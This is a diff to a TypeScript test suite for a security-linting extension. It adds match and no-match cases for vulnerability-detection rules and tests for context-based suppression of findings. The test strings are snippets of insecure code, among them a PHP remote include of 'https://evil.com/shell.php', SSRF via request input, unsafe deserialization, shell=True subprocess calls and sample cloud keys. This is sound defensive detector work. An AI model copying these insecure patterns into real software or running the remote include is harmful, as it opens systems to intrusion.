@@ -57,6 +57,79 @@ function shouldNotMatch(ruleId: string, line: string): void {
 	}
 }
 
+// ── priorContextSafe helpers ──────────────────────────────────────────────────
+// Replicates the suppression logic in diagnosticProvider.ts so we can test it
+// without needing the VS Code API.
+
+function contextSuppressed(
+	rule: SecurityRule,
+	lines: string[],
+	targetIdx: number,
+): boolean {
+	if (!rule.priorContextSafe) {
+		return false;
+	}
+	const { lines: ctxLines, safePatterns } = rule.priorContextSafe;
+	const lineText = lines[targetIdx];
+	const keyRef = /\$_(?:GET|POST|REQUEST)\s*\[[^\]]+\]/i.exec(lineText)?.[0];
+	if (!keyRef) {
+		return false;
+	}
+	const start = Math.max(0, targetIdx - ctxLines);
+	for (let ci = start; ci < targetIdx; ci++) {
+		const ctxLine = lines[ci];
+		if (ctxLine.includes(keyRef)) {
+			for (const sp of safePatterns) {
+				sp.lastIndex = 0;
+				if (sp.test(ctxLine)) {
+					return true;
+				}
+			}
+		}
+	}
+	return false;
+}
+
+function shouldSuppressContext(
+	ruleId: string,
+	lines: string[],
+	targetIdx: number,
+): void {
+	const rule = ruleFor(ruleId);
+	if (!matchesAny(rule, lines[targetIdx])) {
+		passed++; // pattern doesn't fire at all — suppression is moot
+		return;
+	}
+	if (contextSuppressed(rule, lines, targetIdx)) {
+		passed++;
+	} else {
+		failed++;
+		failures.push(
+			`FAIL [${ruleId}] Expected context suppression but got none:\n  ${lines[targetIdx]}`,
+		);
+	}
+}
+
+function shouldNotSuppressContext(
+	ruleId: string,
+	lines: string[],
+	targetIdx: number,
+): void {
+	const rule = ruleFor(ruleId);
+	if (!matchesAny(rule, lines[targetIdx])) {
+		passed++; // pattern doesn't fire at all — no suppression needed
+		return;
+	}
+	if (!contextSuppressed(rule, lines, targetIdx)) {
+		passed++;
+	} else {
+		failed++;
+		failures.push(
+			`FAIL [${ruleId}] Expected NO context suppression but finding was suppressed:\n  ${lines[targetIdx]}`,
+		);
+	}
+}
+
 // ── A01: Directory Traversal ──────────────────────────────────────────────────
 
 shouldMatch("A01-DIRECTORY-TRAVERSAL", "fs.readFile(req.query.filepath)");
@@ -136,10 +209,13 @@ shouldMatch(
 	"A04-MISSING-CSRF",
 	"app.post('/login', (req, res) => { res.json({}) })",
 );
-shouldMatch("A04-MISSING-CSRF", "$name = $_POST['name'];");
-// A line that contains a CSRF reference should NOT fire
-shouldNotMatch("A04-MISSING-CSRF", "$token = $_POST['csrf_token'];");
+// PHP: fires on handler entry points only (isset gate or REQUEST_METHOD check)
+shouldMatch("A04-MISSING-CSRF", "if (isset($_POST['action']))");
+shouldMatch("A04-MISSING-CSRF", "$_SERVER['REQUEST_METHOD'] === 'POST'");
+// A line that contains a CSRF/token/nonce reference should NOT fire
+shouldNotMatch("A04-MISSING-CSRF", "if (isset($_POST['csrf_token']))");
 shouldNotMatch("A04-MISSING-CSRF", "verifyToken($_POST['token']);");
+shouldNotMatch("A04-MISSING-CSRF", "if (isset($_POST['nonce']))");
 
 // ── A04: Mass Assignment ──────────────────────────────────────────────────────
 
@@ -270,6 +346,22 @@ shouldNotMatch(
 	"echo htmlspecialchars($_GET['name'], ENT_QUOTES);",
 );
 
+// ── PHP-SQL-VARIABLE ─────────────────────────────────────────────────────────
+
+shouldMatch(
+	"PHP-SQL-VARIABLE",
+	'mysqli_query($conn, "SELECT * FROM users WHERE id = " . $userId)',
+);
+shouldMatch(
+	"PHP-SQL-VARIABLE",
+	'"SELECT * FROM orders WHERE id=\'" . $orderId . "\'"',
+);
+// Superglobals are handled by PHP-SQL-INJECTION, not PHP-SQL-VARIABLE
+shouldNotMatch(
+	"PHP-SQL-VARIABLE",
+	"mysqli_query($conn, \"SELECT * FROM users WHERE id = \" . $_GET['id'])",
+);
+
 // ── General rules ─────────────────────────────────────────────────────────────
 
 shouldMatch("GEN-HTTP-URL", "fetch('http://api.example.com/data')");
@@ -284,6 +376,94 @@ shouldNotMatch(
 	"// TODO: remove password before deploy",
 );
 shouldNotMatch("GEN-SENSITIVE-COMMENT", "// make sure to hash passwords");
+
+// ── CISA rules ────────────────────────────────────────────────────────────────
+
+// CISA-PHP-UNSERIALIZE
+shouldMatch("CISA-PHP-UNSERIALIZE", "unserialize($_POST['data'])");
+shouldMatch("CISA-PHP-UNSERIALIZE", "unserialize($payload)");
+shouldNotMatch("CISA-PHP-UNSERIALIZE", "json_decode($_POST['data'])");
+
+// CISA-PY-PICKLE-UNSAFE
+shouldMatch("CISA-PY-PICKLE-UNSAFE", "pickle.loads(data)");
+shouldMatch("CISA-PY-PICKLE-UNSAFE", "pickle.load(f)");
+shouldNotMatch("CISA-PY-PICKLE-UNSAFE", "json.loads(data)");
+
+// CISA-PY-YAML-UNSAFE-LOAD
+shouldMatch("CISA-PY-YAML-UNSAFE-LOAD", "yaml.load(stream)");
+shouldNotMatch("CISA-PY-YAML-UNSAFE-LOAD", "yaml.safe_load(stream)");
+
+// CISA-CRYPTO-ECB-MODE
+shouldMatch("CISA-CRYPTO-ECB-MODE", "createCipheriv('aes-128-ecb', key, iv)");
+shouldMatch("CISA-CRYPTO-ECB-MODE", "const mode = MODE_ECB");
+shouldNotMatch(
+	"CISA-CRYPTO-ECB-MODE",
+	"createCipheriv('aes-256-gcm', key, iv)",
+);
+
+// CISA-CRYPTO-HARDCODED-IV
+shouldMatch("CISA-CRYPTO-HARDCODED-IV", "const iv = '0102030405060708'");
+shouldMatch("CISA-CRYPTO-HARDCODED-IV", "iv = b'0000000000000000'");
+shouldNotMatch("CISA-CRYPTO-HARDCODED-IV", "const iv = crypto.randomBytes(16)");
+
+// CISA-JWT-ALG-NONE
+shouldMatch("CISA-JWT-ALG-NONE", "algorithms: ['none']");
+shouldMatch("CISA-JWT-ALG-NONE", "algorithm: 'none'");
+shouldNotMatch("CISA-JWT-ALG-NONE", "algorithms: ['HS256']");
+
+// CISA-JWT-NO-ALG-RESTRICT
+shouldMatch(
+	"CISA-JWT-NO-ALG-RESTRICT",
+	"jwt.verify(token, secret, { expiresIn: '1h' })",
+);
+shouldNotMatch(
+	"CISA-JWT-NO-ALG-RESTRICT",
+	"jwt.verify(token, secret, { algorithms: ['HS256'] })",
+);
+
+// CISA-PHP-TYPE-JUGGLING
+shouldMatch("CISA-PHP-TYPE-JUGGLING", "if ($password == $hash)");
+shouldMatch("CISA-PHP-TYPE-JUGGLING", "if ($token == $_POST['t'])");
+shouldNotMatch("CISA-PHP-TYPE-JUGGLING", "if ($password === $hash)");
+
+// CISA-PHP-DYNAMIC-CLASS
+shouldMatch("CISA-PHP-DYNAMIC-CLASS", "new $$className()");
+shouldMatch("CISA-PHP-DYNAMIC-CLASS", "new $_GET['type']()");
+shouldNotMatch("CISA-PHP-DYNAMIC-CLASS", "new MyClass()");
+
+// CISA-PHP-REMOTE-INCLUDE
+shouldMatch("CISA-PHP-REMOTE-INCLUDE", "include('https://evil.com/shell.php')");
+shouldMatch("CISA-PHP-REMOTE-INCLUDE", "require($_GET['page'])");
+shouldNotMatch(
+	"CISA-PHP-REMOTE-INCLUDE",
+	"include __DIR__ . '/pages/home.php'",
+);
+
+// CISA-PY-SUBPROCESS-SHELL
+shouldMatch("CISA-PY-SUBPROCESS-SHELL", "subprocess.run(cmd, shell=True)");
+shouldMatch("CISA-PY-SUBPROCESS-SHELL", "os.system(f'ping {host}')");
+shouldNotMatch("CISA-PY-SUBPROCESS-SHELL", "subprocess.run(['ls', '-la'])");
+
+// CISA-PY-SSL-NO-VERIFY
+shouldMatch("CISA-PY-SSL-NO-VERIFY", "requests.get(url, verify=False)");
+shouldMatch("CISA-PY-SSL-NO-VERIFY", "ssl.CERT_NONE");
+shouldNotMatch("CISA-PY-SSL-NO-VERIFY", "requests.get(url, verify=True)");
+
+// CISA-PY-JINJA2-AUTOESCAPE-OFF
+shouldMatch(
+	"CISA-PY-JINJA2-AUTOESCAPE-OFF",
+	"jinja2.Environment(loader=loader)",
+);
+shouldMatch("CISA-PY-JINJA2-AUTOESCAPE-OFF", "autoescape=False");
+shouldNotMatch(
+	"CISA-PY-JINJA2-AUTOESCAPE-OFF",
+	"jinja2.Environment(autoescape=True, loader=loader)",
+);
+
+// CISA-PY-XML-UNSAFE
+shouldMatch("CISA-PY-XML-UNSAFE", "ET.fromstring(data)");
+shouldMatch("CISA-PY-XML-UNSAFE", "minidom.parseString(xml_str)");
+shouldNotMatch("CISA-PY-XML-UNSAFE", "defusedxml.fromstring(data)");
 
 // ── Severity regression check — info rules should not be critical ─────────────
 
@@ -300,6 +480,128 @@ assert.strictEqual(
 	"info",
 	"JS-POSTMESSAGE-NO-ORIGIN should be info severity after false-positive fix",
 );
+
+// ── priorContextSafe context-aware suppression ────────────────────────────────
+
+// Same key validated with a real validator in prior context → suppress
+shouldSuppressContext(
+	"PHP-IV-RAW-POST",
+	["if (is_numeric($_POST['id'])) {", "  $user_id = $_POST['id'];"],
+	1,
+);
+
+// isset only (existence check, not a real validator) → do NOT suppress
+shouldNotSuppressContext(
+	"PHP-IV-RAW-POST",
+	["if (isset($_POST['id'])) {", "  $user_id = $_POST['id'];"],
+	1,
+);
+
+// Different key validated → do NOT suppress the un-validated key
+shouldNotSuppressContext(
+	"PHP-IV-RAW-POST",
+	["if (is_numeric($_POST['email'])) {", "  $user_id = $_POST['id'];"],
+	1,
+);
+
+// filter_var in prior context for same key (GET) → suppress
+shouldSuppressContext(
+	"PHP-IV-RAW-GET",
+	[
+		"if (filter_var($_GET['page'], FILTER_VALIDATE_INT)) {",
+		"  $page = $_GET['page'];",
+	],
+	1,
+);
+
+// ── New rules: PHP ────────────────────────────────────────────────────────────
+
+// PHP-CURL-SSRF
+shouldMatch("PHP-CURL-SSRF", "curl_setopt($ch, CURLOPT_URL, $_GET['url']);");
+shouldMatch(
+	"PHP-CURL-SSRF",
+	"curl_setopt($ch, CURLOPT_URL, $_POST['target']);",
+);
+shouldNotMatch(
+	"PHP-CURL-SSRF",
+	"curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);",
+);
+shouldNotMatch(
+	"PHP-CURL-SSRF",
+	"curl_setopt($ch, CURLOPT_URL, 'https://api.example.com');",
+);
+
+// PHP-PHPINFO
+shouldMatch("PHP-PHPINFO", "phpinfo();");
+shouldMatch("PHP-PHPINFO", "  phpinfo()  ");
+shouldMatch("PHP-PHPINFO", "// phpinfo();");
+shouldNotMatch("PHP-PHPINFO", "$info = 'see phpinfo docs';");
+
+// PHP-DEBUG-OUTPUT
+shouldMatch("PHP-DEBUG-OUTPUT", "var_dump($_POST['user']);");
+shouldMatch("PHP-DEBUG-OUTPUT", "print_r($_GET);");
+shouldMatch("PHP-DEBUG-OUTPUT", "var_export($_REQUEST['data'], true);");
+shouldNotMatch("PHP-DEBUG-OUTPUT", "var_dump($sanitizedData);");
+shouldNotMatch("PHP-DEBUG-OUTPUT", "print_r($results);");
+
+// PHP-SESSION-FIXATION
+shouldMatch("PHP-SESSION-FIXATION", "session_id($_GET['sid']);");
+shouldMatch("PHP-SESSION-FIXATION", "session_id($_COOKIE['session']);");
+shouldNotMatch("PHP-SESSION-FIXATION", "session_id();");
+shouldNotMatch("PHP-SESSION-FIXATION", "$sid = session_id();");
+
+// ── New rules: Python ─────────────────────────────────────────────────────────
+
+// IV-PY-SQL-FSTRING
+shouldMatch(
+	"IV-PY-SQL-FSTRING",
+	'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")',
+);
+shouldMatch(
+	"IV-PY-SQL-FSTRING",
+	'db.execute(f"DELETE FROM sessions WHERE token = {tok}")',
+);
+shouldMatch(
+	"IV-PY-SQL-FSTRING",
+	'"SELECT * FROM orders WHERE id = {}".format(order_id)',
+);
+shouldNotMatch(
+	"IV-PY-SQL-FSTRING",
+	'cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))',
+);
+shouldNotMatch(
+	"IV-PY-SQL-FSTRING",
+	'results = db.query("SELECT id FROM logs")',
+);
+
+// IV-PY-DJANGO-CSRF-EXEMPT
+shouldMatch("IV-PY-DJANGO-CSRF-EXEMPT", "@csrf_exempt");
+shouldMatch("IV-PY-DJANGO-CSRF-EXEMPT", "  @csrf_exempt  ");
+shouldMatch("IV-PY-DJANGO-CSRF-EXEMPT", "# @csrf_exempt");
+shouldNotMatch("IV-PY-DJANGO-CSRF-EXEMPT", "csrf_protect");
+
+// IV-PY-DJANGO-ALLOWED-HOSTS
+shouldMatch("IV-PY-DJANGO-ALLOWED-HOSTS", "ALLOWED_HOSTS = ['*']");
+shouldMatch("IV-PY-DJANGO-ALLOWED-HOSTS", 'ALLOWED_HOSTS = ["*"]');
+shouldNotMatch(
+	"IV-PY-DJANGO-ALLOWED-HOSTS",
+	"ALLOWED_HOSTS = ['example.com', 'www.example.com']",
+);
+shouldNotMatch("IV-PY-DJANGO-ALLOWED-HOSTS", "ALLOWED_HOSTS = []");
+
+// ── New rules: General ────────────────────────────────────────────────────────
+
+// GEN-HARDCODED-CLOUD-KEY
+shouldMatch("GEN-HARDCODED-CLOUD-KEY", "AKIAIOSFODNN7EXAMPLE");
+shouldMatch("GEN-HARDCODED-CLOUD-KEY", "ASIAIOSFODNN7EXAMPLE");
+shouldMatch("GEN-HARDCODED-CLOUD-KEY", "-----BEGIN RSA PRIVATE KEY-----");
+shouldMatch("GEN-HARDCODED-CLOUD-KEY", "-----BEGIN OPENSSH PRIVATE KEY-----");
+shouldMatch(
+	"GEN-HARDCODED-CLOUD-KEY",
+	"AIzaSyDaGmWKa4JsXZ-HjGw7ISLn_3namBGewQE",
+);
+shouldNotMatch("GEN-HARDCODED-CLOUD-KEY", "process.env.AWS_ACCESS_KEY_ID");
+shouldNotMatch("GEN-HARDCODED-CLOUD-KEY", "-----BEGIN CERTIFICATE-----");
 
 // ALL_RULES sanity: no duplicate IDs
 const ids = ALL_RULES.map((r) => r.id);
